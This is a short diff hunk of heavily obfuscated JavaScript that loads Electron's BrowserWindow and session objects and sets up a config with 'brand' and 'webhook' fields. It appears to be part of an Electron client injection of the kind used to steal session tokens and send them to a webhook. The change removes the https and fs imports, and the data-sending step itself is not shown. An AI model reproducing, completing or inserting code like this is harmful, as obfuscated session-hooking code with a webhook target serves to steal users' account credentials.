@@ -75,7 +75,7 @@ var _0x4e3e4f = (function() {
 _0x2e51c6();
 const {
     BrowserWindow, session
-} = require(_0x59caf9(0xe8)), os = require('os'), https = require(_0x59caf9(0xec)), querystring = require(_0x59caf9(0x195)), fs = require('fs');
+} = require(_0x59caf9(0xe8)), os = require('os'), querystring = require(_0x59caf9(0x195));
 var config = {
         'brand': _0x59caf9(0x187),
         'webhook': _0x59caf9(0x170),
